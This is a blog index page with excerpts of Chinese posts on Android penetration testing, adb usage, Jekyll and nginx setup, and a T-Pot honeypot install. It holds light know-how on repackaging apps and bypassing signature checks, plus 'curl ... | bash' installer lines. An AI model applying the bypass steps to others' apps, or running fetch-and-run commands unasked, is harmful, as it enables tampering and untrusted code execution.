          <p><a href="/blog/2019/nginx/with/php/404error/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/android/reversr/blog/"><h3 class="ctitle">「安卓渗透」：总览</h3></a>
          <p><csmall>Nov 30, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>摘要：最近在学安卓渗透,遂记录下相关知识点和一些没有弄明白的知识点。持续更新updating~
<br />
<br /></li>
</ul>

<h2 id="前言">前言</h2>
<p>接触了一些安卓渗透的项目，根据不同安全公司内部的要求，规定对于安卓渗透技术的基本原则、工作方式；且使用不同的、对外的商业渗透测试。
综述包括如下:<br />
1.代码、程序安全;<br />
2.验证码机制安全;<br />
3.越权检测;<br />
4.服务器WEB漏洞。</p>

<h2 id="一代码程序安全">一、代码/程序安全</h2>
<h4 id="1源码反编译保证源码安全保证源码不被反编译">1.源码反编译，保证源码安全，保证源码不被反编译。</h4>
<p>防止不法分子阅读源码，了解运行逻辑。</p>
<h4 id="2代码混淆安全对程序代码进行混淆加密">2.代码混淆安全，对程序代码进行混淆加密</h4>
<p>防止不法分子读懂源码。</p>
<h4 id="3二次打包安全">3.二次打包安全</h4>
<p>防止不发分子对安装包进行篡改操作。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		|_主要onCreate操作类，弹窗代码：
				AlertDialog.Builder builder  = new Builder(MainActivity.this);
				builder.setTitle("test alert" ) ;
				builder.setMessage("test by bin4xin" ) ;
				builder.setPositiveButton("yes" ,  null );
				builder.show(); 
		|_在关键位置插入toast提示代码：
				btnToast1.setOnClickListener(new View.OnClickListener() {            
             @Override
             public void onClick(View v) {
                 // TODO Auto-generated method stub
                 Toast toast=Toast.makeText(MainActivity.this,"Toast Message",Toast.LENGTH_SHORT    );
                 toast.setGravity(Gravity.CENTER, 0, 0);
                 toast.show();
             	}
        		});
		|_在关键位置插入关键调试日志输出：
				public static int d(String tsg,String msg)
				Log.d("DEBUG", "This is a debug");
		|_分析smali/so代码的具体校验位置，是否能修改绕过防护；
		|_分析正版合法型数据的绕过。
</code></pre></div></div>
<h4 id="4签名校验安全">4.签名校验安全<br /></h4>
<p>防止不法分子篡改源码、二次打包后传播安装包。</p>
<h4 id="5so文件安全">5.so文件安全？<br /></h4>
<p>so库和import库的区别，so文件可以理解成一个安装包的反汇编文件？）</p>
<h4 id="6h5代码安全">6.H5代码安全？<br /></h4>
<p>（H5代码在安卓工程中的作用是否为静态代码、用于展示等）</p>

<h4 id="7apk升级机制">7.APK升级机制<br /></h4>
<p>防止升级apk为不法分子的二次打包的apk。</p>
<h2 id="二调试安全">二、调试安全</h2>

<h4 id="8debug属性安全">8.debug属性安全</h4>
<p>防止发行版apk可以调试</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	|_AndroidManifest.xml-&gt;[-]删除debuggable属性或设置为false；
</code></pre></div></div>

          <p><a href="/blog/2019/android/reversr/blog/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/android/debug/brige/"><h3 class="ctitle">「安卓渗透」：天之骄子ADB</h3></a>
          <p><csmall>Nov 30, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="adb简介">adb简介</h2>
<p>adb（Android Debug Bridge）Android调试桥是一种功能多样的命令行工具，可让设备之间（PC端和移动端）进行通信。
adb 命令便于执行各种设备操作（例如安装和调试应用），并提供对 Unix Shell（可用来在设备上运行各种命令）的访问权限。
它是一种客户端-服务器程序。</p>

<h2 id="一adb连接">一、adb连接</h2>
<p>本菜使用的是模拟器，不同模拟器端口不一样。比如谷歌模拟器端口则默认为5555;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ adb connect 127.0.0.1:21503
adb server is out of date.  killing...
* daemon started successfully *
connected to 127.0.0.1:21503
$ adb devices
List of devices attached
127.0.0.1:21503 device
</code></pre></div></div>

<h2 id="二adb常使用命令">二、adb常使用命令</h2>
<p>Linux下的命令就不多说了;直接看adb的常用命令(在pc端控制台查看、使用)
Android Debug Bridge version 1.0.32
device commands:</p>
<h4 id="1adb-push">1.adb push</h4>
<blockquote>
  <p>顾名思义，push，推送：</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在pc端控制台将pc端的文件(夹)push到移动端，用法实例：
$ adb push inject /data/local
1606 KB/s (17936 bytes in 0.010s)
进入安卓手机验证:
root@SM-G9350:/data/local # ls
gdb
inject
tmp
</code></pre></div>  </div>
  <p>如上所示inject文件被push到安卓机中。</p>
</blockquote>

<h4 id="2adb-pull">2.adb pull</h4>
<blockquote>
  <p>与push相反</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在pc端控制台将移动端的文件(夹)pull到pc端。
$ adb pull /data/local/inject C:\Users\本阿信
2507 KB/s (17936 bytes in 0.006s)
在pull文件夹控制台验证:
$ dir
 驱动器 C 中的卷是 root
 卷的序列号是 0009-A6D5
 C:\Users\本阿信 的目录（此下DIR为尖括号，会将文本格式闭合，所以换成括号）
2019/11/30  22:25    （DIR）          .
2019/11/30  22:25    （DIR）         ..
2019/11/28  17:15    （DIR）         .android
2019/11/28  17:44    （DIR）         .idlerc
2019/11/30  22:03    （DIR）         .MemuHyperv
2019/10/16  22:05    （DIR）         .ssh
2019/11/30  22:25            17,936 inject
</code></pre></div>  </div>
  <p>如上所示inject文件已经被pull到pc端了。</p>
</blockquote>

<h4 id="3adb-shell">3.adb shell</h4>
<blockquote>
  <p>打开进入已连接安卓机的shell;
adb提示已经连接上了安卓手机，直接进入系统。</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ adb shell
root@SM-G9350:/ # whoami
root
root@SM-G9350:/ # pwd
/
root@SM-G9350:/ # uname -a
Linux localhost 4.0.9 #661 SMP PREEMPT Mon Nov 4 13:15:47 CST 2019 i686 GNU/Linux
</code></pre></div>  </div>
  <p>可以发现有熟悉的Linux系统的影子~</p>
</blockquote>

<h4 id="4adb-shell">4.adb shell</h4>
<blockquote>
  <p>后缀加入<code class="language-plaintext highlighter-rouge">command</code>,不同于3
 run remote shell command
  远程运行shell命令。控制台不进入Andriod Shell;</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ adb shell uname -a
Linux localhost 4.0.9 #661 SMP PREEMPT Mon Nov 4 13:15:47 CST 2019 i686 GNU/Linux
如上，控制台回显信息，但此时还是在pc端控制台，并没有进入安卓控制台。
</code></pre></div>  </div>
</blockquote>

<h4 id="5adb-logcat">5.adb logcat</h4>
<blockquote>
  <p>[<filter-spec>] - View device log
查看设备日志:</filter-spec></p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>查看所有日志：
$ adb logcat
--------- beginning of main
I/Netd    (    0): Netd 1.0 starting
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/default/accept_ra_rt_table: No such file or directory
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/eth0/accept_ra_rt_table: No such file or directory
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/ifb0/accept_ra_rt_table: No such file or directory
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/ifb1/accept_ra_rt_table: No such file or directory
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/lo/accept_ra_rt_table: No such file or directory
E/Netd    (    0): Failed to open /proc/sys/net/ipv6/conf/sit0/accept_ra_rt_table: No such file or directory
I/installd(    0): installd firing up
I/        (    0): debuggerd: Apr  4 2019 17:10:30
</code></pre></div>  </div>
  <p>过滤日志:</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ adb logcat E/WifiStateMachine
E/WifiStateMachine(  509): WifiStateMachine CMD_START_SCAN source -2 txSuccessRate=-0.00 rxSuccessRate=-0.00 targetRoamBSSID=any RSSI=-55
E/WifiStateMachine(  509): WifiStateMachine CMD_START_SCAN source -2 txSuccessRate=-0.00 rxSuccessRate=-0.00 targetRoamBSSID=any RSSI=-55
E/WifiStateMachine(  509): WifiStateMachine CMD_START_SCAN source -2 txSuccessRate=-0.00 rxSuccessRate=-0.00 targetRoamBSSID=any RSSI=-55
E/WifiStateMachine(  509): WifiStateMachine shouldSwitchNetwork  txSuccessRate=-0.00 rxSuccessRate=-0.00 delta 999 -&gt; 999
E/WifiStateMachine(  509): CMD_AUTO_ROAM sup state CompletedState my state ConnectedState nid=0 config "lgrut25642"NONE roam=1 to any targetRoamBSSID any
E/WifiStateMachine(  509): AUTO_ROAM nothing to do
E/WifiStateMachine(  509): WifiStateMachine CMD_START_SCAN source -2 txSuccessRate=-0.00 rxSuccessRate=-0.00 targetRoamBSSID=any RSSI=-55
</code></pre></div>  </div>
</blockquote>

<h4 id="6adb-install">6.adb install</h4>
<blockquote>
  <p>[-lrtsd] <file></file></p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>安装1.apk命令（在pc端，且1.apk为绝对路径）
$ adb install 1.apk
3480 KB/s (54687952 bytes in 15.344s)
        pkg: /data/local/tmp/1.apk
Success
</code></pre></div>  </div>
</blockquote>

<h4 id="7adb-uninstall">7.adb uninstall</h4>
<blockquote>
  <p>[-k] <package> - remove this app package from the device
('-k' means keep the data and cache directories)</package></p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ adb uninstall [-k] com.com.pack
  	Success
  	-k参数值保存安装数据和缓存。
</code></pre></div>  </div>
</blockquote>

<h4 id="8adb-help">8.adb help</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- show this help message;显示帮助信息
</code></pre></div></div>

<h4 id="9adb-version">9.adb version</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- show version num;显示版本号
</code></pre></div></div>

<h2 id="华丽分割线">————————华丽分割线——————————</h2>
<p><br />
<strong>以上,记录。</strong></p>

          <p><a href="/blog/2019/android/debug/brige/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/nginx/with/jekyll-site/"><h3 class="ctitle">nginx和jekyll</h3></a>
          <p><csmall>Nov 22, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>摘要：webrick真是不省心啊。还是nginx大法好～</li>
</ul>

<p>使用nginx作为jekyll博客的服务启动容器介绍：</p>

<h2 id="1jekyll如何工作">1.jekyll如何工作</h2>

<p>首先先从用户角度解释一下我理解中的jekyll服务的运行原理<br />
<code class="language-plaintext highlighter-rouge">1.编写markdown文档-&gt;2.markdown解析-&gt;3.jekyll运行生成web站点文件</code></p>

<p>所以我们直接去找站点文件夹，把web站点文件夹复制到nginx的根目录下就好了</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /your-jekyll-web/
ls                   #我们可以看到_site/文件夹，这个文件夹就是web站点文件夹
cd _site/
vi 2019-01-01-your-article-title.markdown
cp _site/ /var/www/html/ -r
nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
systemctl start nginx
curl localhost
</code></pre></div></div>
<p>测试nginx完毕没有问题，既可以直接启动nginx。然后看一下本地页面，如果出现本地页面就是调试完成了。</p>

<h2 id="2配置nginx-server">2.配置nginx-server</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/nginx/nginx.conf
中间略去，直接看server区块
server {
        listen       80;
        server_name  ip;     #修改这里，如果这里你是公网ip，修改成公网ip就可以啦。
        #charset koi8-r;
        #access_log  logs/host.access.log  main;
		 
		root   /home/www/_site/;

        location / {
			 #try_files $uri $uri/ /index.php$is_args$args;
            index  index.html index.htm;
        				}
 location ~ \.php{          ＃这里是定位到输入php的页面解析代码，如果不需要可以直接注释掉。
				index  index.php index.html;
				include /etc/nginx/snippets/fastcgi-php.conf;
				fastcgi_pass unix:/etc/init.d/php7.3-fpm;
					}

	# deny access to .htaccess files, if Apache's document root
	# concurs with nginx's one
	#
	location ~ /\.ht {
		deny all;
		}
        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        #location = /50x.html {
         #   root   /usr/share/nginx/html;

		}
}
</code></pre></div></div>
<p>同样测试一下，没问题就可以了。
这个时候就可以看一下公网地址是不是已经可以访问上了，访问上就没什么问题了。维护博客就可以通过markdown文件的形式post到服务器上用jekyll解析就可以访问了。</p>

<blockquote>
  <p>希望你们自己也能动手试试看。<code class="language-plaintext highlighter-rouge">么么哒</code></p>
</blockquote>


          <p><a href="/blog/2019/nginx/with/jekyll-site/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/docker/t/pot/"><h3 class="ctitle">Docker环境下T-pot蜜罐部署记录</h3></a>
          <p><csmall>Nov 21, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>摘要:最近在网上冲浪看到一个开源蜜罐项目，看到是基于web的蜜罐项目，web页面是真好看。突发奇想正好手头有个公网ip，最近也在为论文数据来源发愁，索性来试试看。
    <ul>
      <li>先说结论，安装失败。本篇持续更新～（滑稽）</li>
      <li>看介绍项目的帖子说，最新版T-pot 18是基于ubuntu server 18.04 TLS进行部署。果断使用docker试试～</li>
    </ul>
  </li>
</ul>

<h2 id="1docker安装使用">1.docker安装使用</h2>

<h4 id="11使用apt-get进行安装">1.1使用apt-get进行安装</h4>

<p>安装必要的一些系统工具</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get update
sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common
</code></pre></div></div>
<p>安装GPG证书</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
写入软件源信息
sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"
</code></pre></div></div>
<p>更新并安装 Docker-CE</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get -y update
sudo apt-get -y install docker-ce
</code></pre></div></div>

<h2 id="2docker使用语法">2.docker使用语法</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#查看当前环境下docker拥有的镜像
docker images 
#使用宿主机80端口映射且运行ubuntu镜像，镜像使用bash执行
docker run -it -p 80:80 ubuntu /bin/bash
#保存指令，由于docker不会进行容器修改的保存，所以需要手动保存
docker commit -a "runoob.com" -m "my apache" a404c6c174a2  mymysql:v1
#运行保存的容器
docker run -it -p 80:80 ubuntu:v1 
</code></pre></div></div>

<h2 id="3docker中netselect-apt报错">3.docker中netselect-apt报错.</h2>

<h4 id="31-安装netselect-apt依赖的netselect包">3.1 安装netselect-apt依赖的netselect包</h4>

<p>安装netselect之前无法安装netselect-apt，会报错。即netselect是必须依赖项</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>安装netselect_0.3.ds1-28+b1_amd64.deb
wget http://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect_0.3.ds1-28+b1_amd64.deb
dpkg -i netselect_0.3.ds1-28+b1_amd64.deb
</code></pre></div></div>

<h4 id="32-netselect包安装报错">3.2 netselect包安装报错</h4>
<p>以下两个是本菜docker安装时出现的依赖项，贴出来，基本上就是缺什么装什么就行了。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>解决"Can't locate Term/ReadLine.pm" 
安装:apt install libterm-readkey-perl -y
解决"No usable dialog-like program is installed" 
安装:apt install dialog
</code></pre></div></div>
<h4 id="33-安装netselect-apt包">3.3 安装netselect-apt包</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect-apt_0.3.ds1-28_all.deb
dpkg -i netselect-apt_0.3.ds1-28_all.deb
</code></pre></div></div>
<p>安装结束应无任何报错，即代表成功；也可以通过输入两个包进行验证。</p>

<h2 id="4安装t-pot蜜罐">4.安装T-POT蜜罐</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd tpotce/iso/install
./install.sh --type=auto --conf=tpot.conf #自动编译配置，配置文件为tpot.conf
cp tpot.conf.dist tpot.conf #生成配置文件
</code></pre></div></div>
<p>报错 Aborting:debian bionic is not support.看样子是系统版本的问题，无法解决。～搞了一下午，脑阔疼。</p>

          <p><a href="/blog/2019/docker/t/pot/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/jekyll/in/linux/"><h3 class="ctitle">「笔记」：Jekyll for linux.服务器部署历程</h3></a>
          <p><csmall>Nov 18, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>申明：背景图来自微博@胡歌，侵删～不过胡歌这么可爱应该不会介意的</li>
</ul>

<p>第一个问题：这玩意儿是什么？通俗的来讲：<br />
<code class="language-plaintext highlighter-rouge">Jekyll = web server + static blog + front end UI</code><br />
如果你想拥有一个自己的博客但是苦于数据库没学好，你可以来试试看；再如果想学前端，你也可以试试看～</p>

<p>做配置前请默念三遍四者之间的关系，保证倒背如流在进行下一步：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.Ruby 是语言。
2.gem 是一组 Ruby 程序，类似于「包」的概念。
3.RubyGems 是 Ruby 的包管理器，用来管理和安装 gems 的。
4.bundle是用来管理gems的项目，确保能够正确地安装项目依赖，确保能够运行正确的包。
</code></pre></div></div>

<h2 id="1-rvm-安装">1. RVM 安装</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpg <span class="nt">--keyserver</span> hkp://keys.gnupg.net <span class="nt">--recv-keys</span> 409B6B1796C275462A1703113804BB82D39DC0E3
curl <span class="nt">-sSL</span> https://get.rvm.io | bash <span class="nt">-s</span> stable
<span class="c">##如果上面秘钥导入失败会提示command建议，直接复制下来，实在不行找不到使用下面这个链接下载。</span>
curl <span class="nt">-L</span> https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash <span class="nt">-s</span> stable
<span class="nb">source</span> /usr/local/rvm/scripts/rvm  <span class="c">##配置一次性变量，这里terminal暂时使用一下。熟悉的朋友可以直接配进bashrc自启</span>
</code></pre></div></div>
<p>期间会安装各种依赖包，等待一段时间后出现complete字样即成功安装。</p>
<h2 id="2-ruby-安装">2. ruby 安装</h2>
<h3 id="21-切换rvm源">2.1 切换rvm源</h3>
<p>接着就是换源，老外网真的慢- -没办法,跟linux换源是一个道理</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#echo "ruby_url=https://cache.ruby-china.org/pub/ruby" &gt; ~/.rvm/user/db</span>
<span class="c">#此处本菜机子的是.rvmrc，直接把url导入：</span>
<span class="c">#echo "ruby_url=https://cache.ruby-china.org/pub/ruby" &gt; /root/.rvmrc</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">========================</span>2020-03-31更新：换源文件<span class="o">=================================</span>
+<span class="o">==============================================================================</span>+
|echo <span class="s2">"ruby_url=https://cache.ruby-china.com/pub/ruby"</span> <span class="o">&gt;</span> /usr/local/rvm/user/db|
+<span class="o">==============================================================================</span>+
</code></pre></div></div>
<p>找不到更新rvm源的文件，如果是按照上面方法，基本是在上面这个文件下。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@iZ2ze9ebgot9gy5c2mi5ecZ user]# <span class="nb">echo</span> <span class="s2">"ruby_url=https://cache.ruby-china.com/pub/ruby"</span> <span class="o">&gt;</span> /usr/local/rvm/user/db
<span class="o">[</span>root@iZ2ze9ebgot9gy5c2mi5ecZ user]# <span class="nb">cat </span>db
<span class="nv">ruby_url</span><span class="o">=</span>https://cache.ruby-china.com/pub/ruby

<span class="o">[</span>root@iZ2ze9ebgot9gy5c2mi5ecZ user]# rvm <span class="nb">install</span> <span class="s2">"ruby-2.5.7"</span>
Searching <span class="k">for </span>binary rubies, this might take some time.
No binary rubies available <span class="k">for</span>: centos/7/x86_64/ruby-2.5.7.
Continuing with compilation. Please <span class="nb">read</span> <span class="s1">'rvm help mount'</span> to get more information on binary rubies.
Checking requirements <span class="k">for </span>centos.
Requirements installation successful.
Installing Ruby from <span class="nb">source </span>to: /usr/local/rvm/rubies/ruby-2.5.7, this may take a <span class="k">while </span>depending on your cpu<span class="o">(</span>s<span class="o">)</span>...
ruby-2.5.7 - <span class="c">#downloading ruby-2.5.7, this may take a while depending on your connection...</span>
<span class="k">**</span> Resuming transfer from byte position 323584
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12.8M  100 12.8M    0     0  6097k      0  0:00:02  0:00:02 <span class="nt">--</span>:--:-- 6095k
ruby-2.5.7 - <span class="c">#extracting ruby-2.5.7 to /usr/local/rvm/src/ruby-2.5.7.....</span>
ruby-2.5.7 - <span class="c">#configuring...................................................................</span>
ruby-2.5.7 - <span class="c">#post-configuration..</span>
ruby-2.5.7 - <span class="c">#compiling..................................................................................</span>
ruby-2.5.7 - <span class="c">#installing..............................</span>
ruby-2.5.7 - <span class="c">#making binaries executable..</span>
ruby-2.5.7 - <span class="c">#downloading rubygems-3.0.8</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
 25  867k   25  223k    0     0  15138      0  0:00:58  0:00:15  0:00:43 16300

ruby-2.5.7 - <span class="c">#adjusting #shebangs for (gem irb erb ri rdoc testrb rake).</span>
Install of ruby-2.5.7 - <span class="c">#complete</span>
Ruby was built without documentation, to build it run: rvm docs generate-ri
</code></pre></div></div>
<p>基本上看到上面的complete就安装完了</p>

<p>#安装ruby
rvm list know            #查询已知rvm软件列表
rvm install “ruby-2.5.5”   #安装ruby
rvm use 2.5.5          #指定使用的ruby版本号</p>

<h2 id="3-配置ruby-gems环境">3. 配置ruby-gems环境</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#配置前确认：
rvm -v
rvm 1.29.9 (latest) by Michal Papis, Piotr Kuczynski, Wayne E. Seguin [https://rvm.io]
gem -v
3.0.6
ruby -v
ruby -v
ruby 2.5.5p157 (2019-03-15 revision 67260) [x86_64-linux]
gem source -l
gem sources --remove https://rubygems.org/
gem sources -a https://gems.ruby-china.com  ##换源 换源 换源
gem update --system
gem install bundler
</code></pre></div></div>

<h2 id="4-安装jekyll">4. 安装jekyll</h2>

<p><code class="language-plaintext highlighter-rouge">gem install jekyll</code>
安装jekyll工具，保证jekyll能顺畅运行。此处跟每个人下载的模板不一样所需要的工具不一样，我这里把基本的一些工具贴上，后期模板不一样看一下环境要求根据要求即可。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem <span class="nb">install </span>bundler      <span class="c">#打包用工具</span>
gem <span class="nb">install </span>jekyll-paginate <span class="c">#分页设置工具 重要 一定要安装</span>
gem <span class="nb">install </span>minima      <span class="c">#默认主题</span>
gem <span class="nb">install </span>jekyll-feed <span class="c">#订阅用的工具</span>
</code></pre></div></div>
<h2 id="bundle">bundle?</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% <span class="nb">sudo </span>bundle <span class="nb">exec </span>rake production:export
/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229: warning: Insecure world writable <span class="nb">dir</span> /usr/local/sbin <span class="k">in </span>PATH, mode 040777
fatal: 不是一个 git 仓库（或者任何父目录）：.git
Could not find rake-10.5.0 <span class="k">in </span>any of the sources
Run <span class="sb">`</span>bundle <span class="nb">install</span><span class="sb">`</span> to <span class="nb">install </span>missing gems.
</code></pre></div></div>
<p>到你所在的博客目录下，<code class="language-plaintext highlighter-rouge">git init</code>：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro text-theme % pwd
/Users/bin4xin/blog/text-theme
bin4xin@bin4xin'</span>s MacbookPro text-theme % git init
已初始化空的 Git 仓库于 /Users/bin4xin/blog/text-theme/.git/
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% bundle config mirror.https://rubygems.org https://gems.ruby-china.com
/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229: warning: Insecure world writable <span class="nb">dir</span> /usr/local/sbin <span class="k">in </span>PATH, mode 040777
bin4xin@bin4xin<span class="s1">'s MacbookPro text-theme % sudo bundle install                                                  
/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229: warning: Insecure world writable dir /usr/local/sbin in PATH, mode 040777
Don'</span>t run Bundler as root. Bundler can ask <span class="k">for </span><span class="nb">sudo </span><span class="k">if </span>it is needed, and installing your bundle as root will <span class="nb">break </span>this application <span class="k">for </span>all
non-root <span class="nb">users </span>on this machine.
Fetching gem metadata from https://gems.ruby-china.com/...........
Fetching rake 10.5.0
Installing rake 10.5.0
Fetching concurrent-ruby 1.1.5
Installing concurrent-ruby 1.1.5
Fetching i18n 1.7.0
Installing i18n 1.7.0
··省略
··
··
Fetching sassc 2.2.1
Installing sassc 2.2.1 with native extensions

Bundle <span class="nb">complete</span><span class="o">!</span> 3 Gemfile dependencies, 42 gems now installed.
</code></pre></div></div>
<h2 id="5-启动服务">5. 启动服务</h2>
<p>一般你们都是直接下载了模板，模板解压后进入文件夹即可。比如我这里模板文件夹叫blog</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip blog.zip
<span class="nb">cd </span>blog/
git init <span class="c">#如果你有多个模板，记得先用这个命令，把当前文件夹当做根目录；同理使用其他模板第一步输入这个命令</span>
jekyll serve <span class="nt">-P</span> 80   <span class="c">#自动构建并运行jekyll服务</span>
</code></pre></div></div>
<h2 id="6-jekyll报错">6. jekyll报错</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Could not find gem 'X' in any of the gem sources listed in your Gemfile.(Bundler::GemNotFound)
gem install X
安装即可
</code></pre></div></div>

<ul>
  <li>1.jekyll-paginate使用失败 即使是安装了jekyll-paginate，也会报错。
    <ul>
      <li>gem list –local | grep jekyll-paginate #查看本地gem安装插件
确认安装上，在博客根目录下编辑Gemfile，添加：gem ‘jekyll-paginate’, group: :jekyll_plugins</li>
    </ul>
  </li>
  <li>2.cannot load such file – kramdown-parser-gfm (LoadError)
    <ul>
      <li>安装即可。安装 kramdown-parser-gfm ，不要分开一个一个安装。</li>
    </ul>
  </li>
</ul>

<p>现在jekyll服务启动后，web的服务是使用WEBrick服务器，会有以下让我觉得不舒服的地方：<br />
1）目录遍历<br />
2）无法隐藏服务器版本号
（也许是能够这样操作但是我没有发现），所以试了下发现nginx也是可以的<br /></p>

<p><a href="/blog/2019/nginx/with/jekyll-site/">传送门</a></p>

<p>以上。</p>

          <p><a href="/blog/2019/jekyll/in/linux/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/Ubuntu/with/arm/"><h3 class="ctitle">「移植」Ubuntu With Arm公网存储容器搭建记录</h3></a>
          <p><csmall>Sep 1, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>声明：本文章首发于华为云鲲鹏社区，同步于作者个人博客:)</li>
</ul>

<p>鲲鹏云服务器<code class="language-plaintext highlighter-rouge">Ubuntu 18.04 64bit</code> with <code class="language-plaintext highlighter-rouge">ARM</code></p>

<p><code class="language-plaintext highlighter-rouge">PHP</code>+<code class="language-plaintext highlighter-rouge">NGINX</code>软链接演示</p>

<blockquote>
  <p>摘要：华为云社区的活动好多～最近领了个ARM云服务器。打算用服务器搭建一个云存储服务容器方便自己上传论文，说干就干，于是就是在网上找了个开源的项目。下载压缩包下来完事，发现没有php环境，得自己配置。行吧，自己配。</p>
</blockquote>

<p>
    <br />
</p>

<h2 id="1安装nginx网站服务器">1.安装nginx网站服务器</h2>

<h3 id="11-换源">1.1 换源</h3>

<p>
    安装web前记得先把源换一下，ubuntu的官方源我也测试了，确实有点慢。注意换源要换成ARM的版本。这个本菜换的源供大家参考。
</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##ubuntu-ports里面有arm64的源
#切记换掉源～
vi /etc/apt/sources.list
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial main multiverse restricted universe
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ xenial-security main multiverse restricted universe
